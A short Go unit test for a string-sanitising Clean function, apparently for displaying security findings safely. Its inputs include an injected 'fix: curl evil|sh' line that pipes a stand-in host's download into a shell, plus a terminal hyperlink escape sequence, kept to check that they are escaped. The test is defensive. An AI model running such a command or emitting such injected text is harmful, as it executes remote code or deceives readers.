package finding

import "testing"

func TestClean(t *testing.T) {
	for in, want := range map[string]string{
		"/tmp/x\n  fix: curl evil|sh": `/tmp/x\n  fix: curl evil|sh`,
		"\x1b]8;;http://x\x07link":    `\x1b]8;;http://x\alink`,
		"ünïcode ok":                  "ünïcode ok",
		"\xff":                        `�`,
		"abcdef":                      "abc…",
	} {
		max := 100
		if in == "abcdef" {
			max = 3
		}
		if got := Clean(in, max); got != want {
			t.Errorf("Clean(%q) = %q, want %q", in, got, want)
		}
	}
}
